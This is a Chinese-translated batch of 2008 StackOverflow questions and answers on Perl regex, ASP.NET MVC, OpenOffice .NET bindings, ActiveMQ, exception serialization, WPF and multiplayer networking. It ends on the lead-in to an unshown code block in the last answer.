# StackOverflow 问答 000390000-000390999

# regex - 如何将“姓氏，名字”拆分为单独的字符串？

> ID：390000
> 
> 赞同：3
> 
> 时间：2008-12-23T20:28:09.623
> 
> 标签：regex, perl

将字符串“Parisi, Kenneth”分成“Kenneth”和“Parisi”的最佳方法是什么？
我仍在学习如何使用这些正则表达式解析字符串，但不太熟悉如何设置 var 等于匹配的字符串和匹配（或不匹配）字符串的输出。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2008-12-23T20:33:15.807

```
my ($lname, $fname) = split(/,\s*/, $fullname, 2); 
```

请注意第三个参数，它将结果限制为两个。不是严格要求，但恕我直言，这是一个很好的做法。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-23T20:31:52.407

对于没有 unicode 字符的名称，这样的事情应该可以解决问题：

```
my ($lname,$fname) = ($1,$2) if $var =~ /([a-z]+),\s+([a-z]+)/i; 
```

分解它：

*   `([a-z]+)`匹配一系列字符并将其分配给第一组 $1
*   `,`匹配一个逗号
*   `\s+`匹配一个或多个空格（如果空格是可选的，将 + 更改为 *）
*   `([a-z]+)`匹配一系列字符并将其分配给第二组 $2
*   `i`不区分大小写匹配

您可以更改字符类 [az] 以包含您认为对名称有效的字符。

# asp.net-mvc - 如何将控制器和视图组织到命名空间或子文件夹中？

> ID：390002
> 
> 赞同：0
> 
> 时间：2008-12-23T20:29:18.387
> 
> 标签：asp.net-mvc

我正在开发一个 ASP.NET MVC 应用程序。该应用程序分为十几个“部分”，每个部分都有用户可以执行的多项任务。许多这些子任务都应该有自己的控制器，我不喜欢“厨房水槽”控制器。

我想通过添加命名空间层次结构来组织我的控制器：

Foo.SubFoo1.List

Foo.SubFoo2.List

等等

我想出了如何创建路由规则，我只是不知道如何连接正确的视图。**MVC 框架在查找视图时不会将我的控制器的父命名空间考虑到算法中：**

Foo.SubFoo1.List ==> MVC 寻找视图**Views\SubFoo1\List.aspx**，但我*希望*它寻找**Views\Foo\SubFoo1\List.aspx**

建议？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-12-23T20:37:04.207

你的问题的字面答案是“覆盖默认的 ViewEngine”，但听起来你真的在寻找[“区域”。](http://blog.codeville.net/2008/11/05/app-areas-in-aspnet-mvc-take-2/)

# .net - OpenOffice 和 .NET

> ID：390006
> 
> 赞同：16
> 
> 时间：2008-12-23T20:30:36.247
> 
> 标签：.net, openoffice.org

OpenOffice 是否有 .NET API？

编辑：是否有适用于 .NET 的 OpenOffice SDK？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-09-10T22:29:04.617

如果您安装了 OpenOffice，那么您可以使用“OpenOffice SDK”（[此处为当前版本](http://www.openoffice.org/api/SDK/index.html)）从多个编程环境（包括 .NET）控制该实例。您可以通过这种方式使用 OpenOffice 来完成许多不同的事情；一个示例是将文件从一种文件格式转换为另一种文件格式。这类似于您如何通过 COM 控制 Microsoft Office。

SDK 附带一组 CLI/.NET 绑定，默认安装在（*SDK v3.0 的示例*）中：

> C:\Program Files\OpenOffice.org_3.0_SDK\sdk\cli

我发现 Mark Alexander Bain 的[使用 C# 创建 OpenOffice Calc 文档](http://c-programming.suite101.com/article.cfm/creating_an_openoffice_calc_document_with_c)是关于以这种方式控制 OpenOffice 的最直接、实用的介绍性文章。

CLI 绑定主要是非 .NET 对象模型的端口/映射，因此您需要了解非 .NET 特定的 OpenOffice API[开发人员指南 之](http://wiki.openoffice.org/wiki/Documentation/DevGuide/OpenOffice.org_Developers_Guide)类的内容。

到目前为止，我发现 CLI 绑定和其他文档之间的主要区别在于，通过 CLI 绑定，您可以使用普通的 .NET 转换语法而不是使用 UnoRuntime.queryInterface() 方法将对象转换为新接口。例如，而不是

```
XComponentLoader xComponentLoader =
    (XComponentLoader)UnoRuntime.queryInterface(XComponentLoader.class, desktop); 
```

只需使用

```
XComponentLoader xComponentLoader = (XComponentLoader)desktop; 
```

这里还有一些关于 OpenOffice/UNO 的东西如何映射到 CLI 绑定中的 .NET 概念的漂亮技术文档：http: [//wiki.services.openoffice.org/wiki/Documentation/DevGuide/ProUNO/CLI/CLI_Language_Binding](http://wiki.services.openoffice.org/wiki/Documentation/DevGuide/ProUNO/CLI/CLI_Language_Binding)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-12-23T20:46:16.857

Novel 有一个添加单声道功能的 OOo 分支，因此您可以通过 .Net 在 OOo 中使用这些构建进行脚本编写。OOo（Base 除外）的文档格式是 XML + zip 容器中的资源。如果您需要手动文件操作以外的编程访问，最好的办法是使用带有 COM 互操作的 ActiveX 控件。如果你想在 .Net 中使用 Base 作为数据源，那几乎是不可能的，因为它是一个没有成熟 .net 端口的嵌入式 Java 数据库结构。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2008-12-23T21:42:21.360

[这可能会有所帮助：](http://wiki.services.openoffice.org/wiki/AODL)

> “AODL 是 ODF Toolkit 的 .net 模块。该库完全用纯 C# 编写，可用于扩展基于 .net 的软件以支持 OpenDocument 格式。要在您的项目中分别使用 AODL 软件，无需深入了解 OpenDocument 格式本身。了解幕后发生的事情和编写自己的扩展会很有帮助，但如前所述，这不是基本要求。

该模块在 Apache 孵化器过渡期间已被放弃，最近的官方二进制文件或源下载不可用（请参阅[新闻组帖子 1](https://mail-archives.apache.org/mod_mbox/incubator-odf-dev/201108.mbox/%3CCAP-ksoiaybCr3Tg5keSrUpObkSKvnO+uUft70K23UZ0Gr0KnJA@mail.gmail.com%3E)、[新闻组帖子 2](https://mail-archives.apache.org/mod_mbox/incubator-odf-dev/201108.mbox/%3C007a01cc6421$9598a8d0$c0c9fa70$@acm.org%3E)、[新闻组帖子 3](https://mail-archives.apache.org/mod_mbox/incubator-ooo-dev/201107.mbox/%3C4E0E0DAF.2030600@gmail.com%3E)。

[最新的二进制下载是旧的 ADL SourceForge 项目页面](http://sourceforge.net/projects/aodl/files/AODL/)中提供的 v1.2.0.1 ，而似乎是导致（也被放弃的）[fork 的最新源代码可在 Bitbucket 上找到](https://bitbucket.org/chrisc/aodl/src)（文档和变更日志包含在源树读取 v1.3.0.0) 并编译得很好。

将来新的 ODFDOM 中可能会有一个官方的替代方案，它的生成器有一天应该支持 .NET/C#/etc：

> ODFDOM 代码生成器用于为 ODFDOM 生成核心类，这些类是 ODF 元素在真实 Java 类上的类型化映射。对于未来，我们还计划使用此生成器为其他编程语言生成 ODFDOM，例如 C# (.NET)。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-23T20:38:26.280

取决于你的需要。大多数 OpenOffice 文档格式都是 XML 可读和可创建的。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-15T17:03:35.217

[.NET Framework 的开放文档格式 API](http://www.independentsoft.de/odf/index.html)

API 支持*OASIS 开放文档格式*中定义的*开放文档格式*标准。ODF .NET 允许您编写应用程序来创建、修改和解析文本文档和电子表格。支持所有版本的 .NET Framework、.NET Compact Framework 和 Mono。

 *# asp.net - 在嵌套的 ListView 中隐藏表格列

> ID：390017
> 
> 赞同：1
> 
> 时间：2008-12-23T20:34:17.003
> 
> 标签：asp.net, html, listview

我在另一个 ListView 中有一个 ListView，每当传递特定参数时，我想在内部 ListView 中隐藏一个表列。鉴于下面的设置，如果 URL 包含“...？id=no”，我将如何隐藏 ID 列（标题和数据）？

```
<asp:ListView ID="ProcedureListView" runat="server">
    <LayoutTemplate>
        <asp:PlaceHolder ID="itemPlaceHolder" runat="server" />
    </LayoutTemplate>
    <ItemTemplate>
        <h4>
            <%#Eval("PROCEDURE_CODE") %>
        </h4>
        <asp:ListView ID="BenefitListView" runat="server" DataSource='<%#Eval("benefits") %>'>
            <LayoutTemplate>
                <table cellpadding="5" class="indent">
                    <tr class="tableHeader">
                        <td>
                            ID
                        </td>
                        <td>
                            Benefit
                        </td>
                    </tr>
                    <asp:PlaceHolder ID="itemPlaceHolder" runat="server" />
                </table>
            </LayoutTemplate>
            <ItemTemplate>
                <tr>
                    <td>
                        <%#Eval("benefit_id")%>
                    </td>
                    <td>
                        <%#Eval("benefit_name")%>
                    </td>
                </tr>
            </ItemTemplate>
        </asp:ListView>
    </ItemTemplate>
</asp:ListView> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-23T21:49:15.870

如果您尝试从后面的代码中执行此操作，则可以执行以下操作：

在外部 ListView 的 onBind 事件中，您会找到内部 listview 控件，然后找到所需的标签并将可见属性更改为 false。我在你的另一个问题上回答了这个问题。

祝你好运！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-23T20:44:18.903

您可以将它们包装在占位符中，然后动态设置占位符的可见性以删除列...（您将需要两个占位符）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-23T20:57:42.433

您可以执行以下操作：

```
<% if (Request.QueryString["id"] != "no") { %>
   <td>
     <%#Eval("benefit_id")%>
   </td>
<% } %>
   <td>
     <%#Eval("benefit_name")%>
   </td> 
```

并为标题做同样的事情。

编辑：您不清楚，但从先前的评论来看，如果您想在后面的代码中执行此操作，那么您应该将 id 标头和 id 数据放在标签服务器控件中。然后您可以检查后面代码中的查询字符串，并在数据绑定时将可见属性设置为 false。

这里有几个选项，这真的取决于你最喜欢什么。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-23T21:36:56.690

将 css 类添加到 HTML 标记中，并从后面的代码将 css 类注入到页面中，如下所示

```
<td id='' class='hideMe'> 
    ID
</td> 
```

代码后面，在预渲染事件中

```
if(id==123){
   // please refer to help file for exact syntax
   // but essentially you will be injecting
   // <style type='text/css'>
   // .hideMe{display:none;}
   // </style>
} 
```

或者，您可以在样式表中包含上述 css 类，并仅根据 ID 将其添加到您想要隐藏的标签中

# php - 使用正则表达式的模板 ifs

> ID：390033
> 
> 赞同：0
> 
> 时间：2008-12-23T20:39:59.020
> 
> 标签：php, regex

大家好，我正在开发一个 PHP 应用程序，该应用程序需要解析一个包含 HTML 的 .tpl 文件，我正在制作它，以便 HTML 可以包含变量和基本的 if 语句。if 语句看起来像这样：`

```
<!--if({VERSION} == 2)-->
Hello World
<!--endif --> 
```

为了解析它，我尝试使用`preg_replace`没有运气。我尝试的模式是

`/<!--if\(([^\]*)\)-->([^<]*)<!--endif-->/e`

它被替换为

`if($1) { echo "$2"; }`

关于为什么这不起作用以及我可以做些什么来启动和运行它的任何想法？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-23T20:52:12.990

您在 and 之间有一个空格`endif`，`-->`但您的正则表达式不允许这样做。

顺便说一句，这似乎非常不安全......你有什么理由不使用像 Smarty 这样的预构建模板引擎？

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-23T20:53:57.107

测试您的正则表达式，我看到您的反斜杠应用于方括号。要在带引号的字符串内的方括号内使用反斜杠，您需要将其转义两次：

```
'/<!--if\(([^\\\]*)\)-->([^<]*)<!--endif-->/e' 
```

但是我不知道你为什么要发明一个新的模板逻辑框架，当像 Smarty 和 PHP 本身这样的解决方案存在时。

* * *

这是针对以下评论的测试代码。

**测试输入.tpl**：

```
<!--if({VERSION} == 2)-->
Hello World
<!--endif--> 
```

**匹配.php**：

```
<?php
$template = file_get_contents('testinput.tpl');
print preg_match('/<!--if\(([^\\\]*)\)-->/e', $template) . "\n";
print preg_match('/<!--endif-->/e', $template) . "\n";
print preg_match('/<!--if\(([^\\\]*)\)-->([^<]*)<!--endif-->/e', $template) . "\n"; 
```

**试运行**：

```
$ php match.php
1
1
1 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-23T22:31:22.243

我认为您打算这样做：

```
'/<!--if\(([^)]*)\)-->([^<]*)<!--endif-->/' 
```

您的正则表达式中只有一个字符类：

```
[^\]*)\)-->([^<] 
```

这是正在发生的事情：

*   第一个右方括号被反斜杠转义，所以它是按字面意思匹配的。
*   应该关闭第一个捕获组并打开第二个捕获组的括号也按字面意思使用；没有必要在字符类中转义括号。
*   The first hyphen *is* taken as a metacharacter; it forms the range [)*+,-]
*   The second opening square bracket is taken as a literal square bracket because it's inside a character class.
*   The second caret is taken as a literal caret because it's not the first character in the class.

So, after removing the duplicates and sorting the characters into their ASCII order, your character class is equivalent to this:

```
[^()*+,\-<>\[\]^] 
```

And the parentheses outside the character class are still balanced, so the regex compiles, but it doesn't even come close to matching what you wanted it to.

# vb.net - ActiveMQ 消息接收事件每秒只有一条消息？

> ID：390044
> 
> 赞同：0
> 
> 时间：2008-12-23T20:45:01.943
> 
> 标签：vb.net, activemq

我们已经建立了一个基于 ActiveMQ 的应用程序基础设施。

我们可以很好地发送和接收消息，并且在大多数情况下，事情非常快而且还可以。

但是，我们注意到，如果我们“一次”提交一批消息，比如 5,000 条消息 - ActiveMQ 将很快将消息发送到另一端的第 3 方应用程序，并且该应用程序也将很快处理，并且它也会将回复排队快速返回给经纪人，比如不到一分钟。

但是由于某种原因，我们最初生成消息的 VB.NET EXE 似乎只是在处理它收到的返回消息不规律，有时大约每秒处理一个，有时会中断一个小时左右，然后返回每秒一个。

```
Origin (VB.NET EXE which we manage) 
    -> Broker  (which we manage)
        -> (3rd party app) 
            -> back to the same broker 
                -> back to the origin app. 
```

接收器正在等待可能 9 个月前从 ActiveMQ 下载的 C# 代码中的事件 MessageListener：

```
Public Delegate Sub MessageListener(ByVal message As NMS.IMessage)
     Member of: NMS 
```

我认为发生的事情是 MessageListener 只给我们一条消息 (NMS.IMessage) 来咀嚼，所以这就是我们处理的。

有没有办法说“在 MessageListener 事件中，请查看队列中是否还有其他消息并全部执行”？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-09T20:44:09.810

事实证明，我们认为我们现在知道的更多了。

当我们使用 ActiveMQ DLL 的 VB.NET WinForms 应用程序最终崩溃时（通常每周会发生几次），我们有一个看门狗程序，它使用 Winternals pslist 和 pskill 实用程序来获取僵尸程序，然后启动一个新客户端联系。

发生这种情况时，使用 jconsole 分析代理向我们显示僵尸会话仍在注册，新客户端也是如此。

我现在的理论是，当 AMQ 看到两个会话时，它会尝试开始以循环方式将消息分发到两个会话。AMQ 尝试将消息发送给僵尸，僵尸没有响应。一段时间后（也许一秒钟）AMQ 放弃并进入列表中的下一个会话，即新的新客户端。

在某些时候，代理或 TCP 堆栈可能会注意到僵尸没有保持其 TCP 连接处于活动状态并且它放弃了；然后操作恢复正常。

所以问题就变成了，如何编写一个 ActiveMQ 客户端，a) 不会死或 b) 优雅地死，在此过程中关闭它的会话？

编辑：升级到下一个版本的 ActiveMQ 解决了这个问题。此外，我们有一个应用程序进行发送和接收，但它不是线程安全的 - 所以如果它在尝试发送时接收到，则会导致崩溃。我们将其重写为两个控制台应用程序，一个发送数据，一个接收数据。没有更多的崩溃。此外，我们当时使用的旧版本的 ActiveMQ 并不能优雅地处理崩溃，升级到 4.x 解决了这个问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-31T07:44:55.163

我建议向[用户论坛](http://activemq.apache.org/camel/discussion-forums.html)报告此问题，并可能提出[支持问题](http://activemq.apache.org/camel/support.html)，因为这听起来可能是 NMS 客户端代码的问题，所有 NMS 开发人员都在该列表中并且可能会做出回应

# c# - 在 C# 中，如何序列化 System.Exception？（.Net CF 2.0）

> ID：390051
> 
> 赞同：19
> 
> 时间：2008-12-23T20:51:31.963
> 
> 标签：c#, exception, serialization, compact-framework

我想向 MS 消息队列写入异常。当我尝试它时，我得到了一个例外。所以我尝试通过使用仍然引发异常的 XmlSerializer 来简化它，但它给了我更多信息：

> {“反映类型 'System.Exception' 时出现错误。”}

带有内部异常：

> {“无法序列化 System.Collections.IDictionary 类型的成员 System.Exception.Data，因为它实现了 IDictionary。”}

示例代码：

```
 Exception e = new Exception("Hello, world!");
        MemoryStream stream = new MemoryStream();
        XmlSerializer x = new XmlSerializer(e.GetType()); // Exception raised on this line

        x.Serialize(stream, e);
        stream.Close(); 
```

编辑：我尽量保持简单，但我可能做得过火了。我想要整个位、堆栈跟踪、消息、自定义异常类型和自定义异常属性。我什至可能想再次抛出异常。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2008-12-23T22:11:43.143

我正在查看 Jason Jackson 的答案，但即使 System.Exception 实现了 ISerializable，我也没有任何意义。因此，我通过将异常包装在使用 BinaryFormatter 的类中来绕过 XmlSerializer。当 MS 消息队列对象的 XmlSerialization 启动时，它将看到一个具有公共字节数组的类。

这是我想出的：

```
public class WrappedException {
    public byte[] Data;

    public WrappedException() {
    }

    public WrappedException(Exception e) {
        SetException(e);
    }

    public Exception GetException() {
        Exception result;
        BinaryFormatter bf = new BinaryFormatter();
        MemoryStream stream = new MemoryStream(Data);
        result = (Exception)bf.Deserialize(stream);
        stream.Close();
        return result;
    }

    public void SetException(Exception e) {
        MemoryStream stream = new MemoryStream();
        BinaryFormatter bf = new BinaryFormatter();
        bf.Serialize(stream, e);
        Data = stream.ToArray();
        stream.Close();
    }
} 
```

第一个测试运行良好，但我仍然担心自定义异常。所以我把我自己的自定义异常扔在一起。然后我只是在一个空白表格上放了一个按钮。这是代码：

```
[Serializable]

public class MyException : Exception, ISerializable {
    public int ErrorCode = 10;
    public MyException(SerializationInfo info, StreamingContext context)
        : base(info, context) {

        ErrorCode = info.GetInt32("ErrorCode");
    }

    public MyException(string message)
        : base(message) {
    }

    #region ISerializable Members
    void ISerializable.GetObjectData(SerializationInfo info, 
        StreamingContext context) {

        base.GetObjectData(info, context);
        info.AddValue("ErrorCode", ErrorCode);
    }

    #endregion
}

private void button1_Click(object sender, EventArgs e) {
    MyException ex = new MyException("Hello, world!");
    ex.ErrorCode = 20;
    WrappedException reply = new WrappedException(ex);
    XmlSerializer x = new XmlSerializer(reply.GetType());
    MemoryStream stream = new MemoryStream();
    x.Serialize(stream, reply);
    stream.Position = 0;
    WrappedException reply2 = (WrappedException)x.Deserialize(stream);
    MyException ex2 = (MyException)reply2.GetException();
    stream.Close();
    Text = ex2.ErrorCode.ToString(); // form shows 20

    // throw ex2;

    } 
```

尽管我查找的所有其他异常类型似乎都标有 SerializableAttribute，但我必须小心未标有 SerializableAttribute 的自定义异常。

编辑：超越自己。我没有意识到 BinaryFormatter 没有在 CF 上实现。

编辑：上面的代码片段在桌面项目中。在 CF 版本中，WrappedException 看起来基本相同，我***只***需要实现我自己的 BinaryFormater，但我非常愿意接受关于那个的建议。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2008-12-23T21:07:58.293

## 评论：

在跨进程边界进行远程处理或与系统交互时，序列化异常是一项常见任务。不要听别人说别的；他们可能从未编写过远程库。

## 解决方案：

我之前通过创建一个自定义的基本异常类来进行远程处理。我遇到的问题是 System.Exception 不容易序列化，所以我必须继承它。我处理这个问题的方法是创建我自己的序列化异常（通过 ISerializable），并将任何 System.Exception 包装在自定义异常中。

在整个服务器代码中，无论如何您都应该使用自定义异常，这些都可以基于您的可序列化基本类型。这不是很多工作，您将很快建立一个通用的异常库来通过。

您写入队列（并从中读取）的层应该执行所有异常序列化/水合。你可能会考虑这样的事情：

```
public class WireObject<T, E>
{
  public T Payload{get;set;}
  public E Exception{get;set;}
} 
```

与您的队列对话的服务器和客户端层将包装您在有效负载中发送的对象，或附加异常（如果有）。当从队列中消耗数据时，客户端层可以检查异常并在存在时重新抛出异常，否则将数据交给您。

这是我之前写的和我看到其他人写的非常简单的版本。祝你的项目好运。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2008-12-23T20:57:09.097

我认为您基本上有两种选择：

1.  做你自己的手动序列化（可能不想这样做）。由于您在内部异常中获得的确切消息，XML 序列化肯定不会起作用。
2.  创建您自己的自定义（可序列化）异常类，将抛出的异常中的数据注入您的自定义异常类并对其进行序列化。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-12-23T20:54:18.320

为什么？您是否在从消息队列中检索异常时实例化它？如果没有，只需发送异常消息（作为字符串）...

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-23T23:03:11.493

好吧，XML 序列化在其用途上是有限的。例如，它不能序列化这个特定的场景。对于 Exceptions 的精确序列化和反序列化，您必须使用 a `BinaryFormatter`，只要您自己的异常被标记，它就可以工作`[Serializable]`。所有 .Net 异常都用这个标记，这`SerializableAttribute`意味着它们可以用 .Net 序列化`BinaryFormatter`。

不过，你必须注意一个问题。
如果您的异常不可序列化，它显然会失败。但是，当您的异常包含不可序列化的字段时，它也会失败。您应该注意以确保在您的自定义异常中这是不可能的。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2011-06-17T19:59:43.223

我遵循了此[链接](http://social.msdn.microsoft.com/Forums/en-US/wcf/thread/83ceb6bd-83c8-4106-abe5-04431668be48/)中建议的方法（向下滚动以查看名为 Kubilay 的人发布的答案），它对我很有用。无需为异常对象创建任何包装类。

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2008-12-23T20:55:56.273

您不能将字典序列化为 xml。照其他人说的做，然后发送信息，无论如何，这很重要。

# wpf - 绑定时如何在 ListView 中显示组合框？

> ID：390052
> 
> 赞同：1
> 
> 时间：2008-12-23T20:51:41.697
> 
> 标签：wpf

我在绑定到自定义类列表的列表视图中显示多行数据。自定义类有一个名为 type 的属性。允许类型的数量是有限的，我想限制用户通过从组合框中进行选择来进行更改。我尝试向基类添加一个组合框，但它没有在列表视图中显示为组合框。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2008-12-23T20:56:40.033

您需要使用数据模板。

网上有很多教程。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-24T01:50:00.847

在网上找到了这个，似乎是开始使用 DataTemplates 的一个很好的起点。

[http://social.msdn.microsoft.com/Forums/en-US/wpf/thread/749c8e84-3af3-4ec9-90b1-297d684025e7/](http://social.msdn.microsoft.com/Forums/en-US/wpf/thread/749c8e84-3af3-4ec9-90b1-297d684025e7/)

```
<Window x:Class="Window1"
xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
Title="Window1" Height="300" Width="300">

<Window.Resources>

    <XmlDataProvider x:Key="MyData" XPath="/Info">
        <x:XData>
            <Info xmlns="">
                <Item ID="123" Catalog="Category1"/>
                <Item ID="456" Catalog="Category2"/>
                <Item ID="789" Catalog="Category3"/>
            </Info>
        </x:XData>
    </XmlDataProvider>

    <CollectionViewSource x:Key='src' Source="{Binding Source={StaticResource MyData}, XPath=Item}" />

</Window.Resources>

<Grid>

    <ListView Name="mylist" ItemsSource="{Binding Source={StaticResource src}}">

        <ListView.View>

            <GridView>

                <GridViewColumn Header="Catalog" Width="100">

                    <GridViewColumn.CellTemplate>
                        <DataTemplate>
                            <ComboBox Name="mycombo" SelectedValue="{Binding XPath=@Catalog}">
                                <ComboBoxItem>Category1</ComboBoxItem>
                                <ComboBoxItem>Category2</ComboBoxItem>
                                <ComboBoxItem>Category3</ComboBoxItem>
                            </ComboBox>
                        </DataTemplate>

                    </GridViewColumn.CellTemplate>

                </GridViewColumn>

                <GridViewColumn Header="ID" Width="100" DisplayMemberBinding="{Binding XPath=@ID}" />

            </GridView>

        </ListView.View>

    </ListView>

</Grid> 
```

# asp.net - 如何在 .NET 中创建一个“通过”表单/文件 POST 到远程服务器？

> ID：390057
> 
> 赞同：0
> 
> 时间：2008-12-23T20:53:49.010
> 
> 标签：asp.net

我正在尝试将文件发布到远程服务器并传递一些隐藏值。因此，在我的代码中，我想创建一个对[http://www.someotherdomain.com/upload.php](http://www.someotherdomain.com/upload.php)的请求并从该帖子中检索 xml 结果。谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-23T21:13:38.640

您将使用[HttpWebRequest](http://msdn.microsoft.com/en-us/library/system.net.httpwebrequest.aspx)类。一些示例代码可以在[http://www.netomatix.com/httppostdata.aspx找到](http://www.netomatix.com/httppostdata.aspx)

# networking - 实时多人游戏（概念题）

> ID：390067
> 
> 赞同：2
> 
> 时间：2008-12-23T20:59:42.133
> 
> 标签：networking, compression, real-time, multiplayer

我一直在阅读Valve 的[这篇文章](http://developer.valvesoftware.com/wiki/Source_Multiplayer_Networking)，该文章似乎解释了他们的多人游戏系统的架构。似乎他们在客户端延迟渲染几个滴答，以便他们可以处理丢弃的数据包，但他们也将数据包作为“增量快照”（两个相邻状态之间的差异）发送。

假设我们有时间 A、B、C，并且客户端在时间 A 是正确的，但在 B 丢包，然后在 C 接收包。它如何正确推断 C 时间的状态？C 的数据包只告诉（我认为）状态 B 和 C 之间的增量，而客户端只知道 A 的状态。我在这里缺少什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-06-01T13:35:46.850

增量不必与之前发送的消息相关（通过增量或快照）。相反，它们将与最后*确认*的状态相关。因此，在上面的示例中，C 处的更新可能是相对于 A 的增量。因此，随着增量变大（并且潜在的错误正在累积），丢失消息 B 会带来不便，但最终消息会通过并被确认，并且服务器可以开始发送相对于该更新状态的增量。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-23T21:07:37.607

完整状态会定期同步或根据客户端请求同步。[内插](http://en.wikipedia.org/wiki/Interpolation)/[外插](http://en.wikipedia.org/wiki/Extrapolation)可用于在等待完整位置更新时补偿数据包丢失。一些事件需要可靠交付，并且可以添加确认接收的方法。

Glenn Fiedler在他的[博客](http://gafferongames.wordpress.com/)上有一些关于网络游戏的[优秀文章](http://gafferongames.wordpress.com/networking-for-game-programmers/)。

[这篇关于 Quake 3 网络的旧文章](http://trac.bookofhook.com/bookofhook/trac.cgi/wiki/Quake3Networking)听起来很相似。增量状态表示从收到的最后一个客户端确认状态的更改。因此，如果服务器发现客户端落后，则将根据客户端状态和当前服务器状态之间的差异创建下一个增量。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-23T21:08:06.657

如果不看实现，我会想象数据包 C 还包括数据包的 id，它是来自的增量（在本例中为数据包 B）。

当客户端在包 A 之后收到包 C 时，它会知道它还没有看到包 B，因此可以向服务器请求完整的更新。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2008-12-23T21:04:25.243

我猜他们每隔一段时间就会发送一个完整的快照。这就是为什么滞后游戏涉及人们在丢弃增量帧时以错误的速度运行，然后在完整快照出现时“传送”到正确的位置。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2008-12-23T21:10:56.993

从链接的文章：

> 通常只有在游戏开始或客户端遭受严重数据包丢失几秒钟时才会发送完整（非增量）快照。客户端可以使用 cl_fullupdate 命令手动请求完整快照。

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2008-12-23T21:34:13.967

服务器可能会定期但不那么频繁地发送完全同步（即不是增量）。这就是我正在做的，至少。

# asp.net-mvc - ASP.NET MVC - Html.DropDownList - 值未通过 ViewData.Model 设置

> ID：390083
> 
> 赞同：17
> 
> 时间：2008-12-23T21:09:18.697
> 
> 标签：asp.net-mvc, html-helper

刚刚开始使用 ASP.NET MVC 并偶然发现了以下情况。感觉很像一个错误，但如果不是，我们将不胜感激:)

视图包含非常基本的东西

```
<%=Html.DropDownList("MyList", ViewData["MyListItems"] as SelectList)%>
<%=Html.TextBox("MyTextBox")%> 
```

不使用模型时，按预期设置值和选定项：

```
//works fine
public ActionResult MyAction(){
  ViewData["MyListItems"] = new SelectList(items, "Value", "Text"); //items is an ienumerable of {Value="XXX", Text="YYY"}

  ViewData["MyList"] = "XXX"; //set the selected item to be the one with value 'XXX'
  ViewData["MyTextBox"] = "ABC"; //sets textbox value to 'ABC'

  return View();
} 
```

但是当尝试通过模型加载时，文本框的值按预期设置，但下拉菜单没有获得选定的项目集。

```
//doesnt work
public ActionResult MyAction(){
  ViewData["MyListItems"] = new SelectList(items, "Value", "Text"); //items is an ienumerable of {Value="XXX", Text="YYY"}

  var model = new {
    MyList = "XXX", //set the selected item to be the one with value 'XXX'
    MyTextBox = "ABC" //sets textbox value to 'ABC'
  }

  return View(model);
} 
```

有任何想法吗？我目前对此的想法是，也许在使用模型时，我们仅限于在 SelectList 构造函数上设置所选项目，而不是使用视图数据（工作正常）并将选择列表与模型一起传递——这将有好处稍微清理一下代码 - 我只是想知道为什么这种方法不起作用....

非常感谢您的任何建议

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2009-11-24T01:51:02.803

实际上，您只需**`null`**通过`Html.DropDownList()`.
我遇到了同样的问题，并使用反射器查看了 MVC 源代码。

在`System.Web.Mvc.Extensions.SelectExtensions`类的`SelectInternal()`方法中，它检查**selectList**参数是否为**空**。如果它作为 传入`null`，它会正确查找`SelectList`。

这是“代码隐藏”。

```
ViewData["MyDropDown"] = new SelectList(selectListItems,
                             "Value",
                             "Text",
                             selectedValue.ToString()
                         ); 
```

这是 HTML 视图代码。

```
<%= Html.DropDownList("MyDropDown", null,
        "** Please Select **",
        new { @class = "my-select-css-class" }
    ) %> 
```

注意：我使用的是 ASP.NET MVC 2.0（测试版）。

## 更新说明：2012 年 1 月 31 日

在过去 3 年广泛使用 ASP.NET MVC 之后，我更喜欢使用**`additionalViewData`**from[`Html.EditorFor()`方法](http://msdn.microsoft.com/en-us/library/ie/ff406462.aspx)。

**将[List Items]**作为与模型属性具有**相同属性名称**`anonymous`的对象传递到方法中。 **`Html.EditorFor()`**

 **```
<%= Html.EditorFor(
    m => m.MyPropertyName,
    new { MyPropertyName = Model.ListItemsForMyPropertyName }
) %> 
```

如果您想了解更多详细信息，请在此处参考[我在另一个线程中的回答](https://stackoverflow.com/questions/4087815/how-to-pass-data-to-the-view-in-mvc-asp-net/4099487#4099487)。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2008-12-23T23:13:24.093

经过一堆折边和折边后，它归结为以下代码行

```
if (ViewData.ModelState.TryGetValue(key, out modelState)) 
```

这意味着 MVC 试图通过仅查看 ViewData Dictionary<> 对象而不遍历 ViewData.Model 对象来解析该值。

我不确定这是错误、限制还是设计决定。但是，您可以通过以下方式修复它：

```
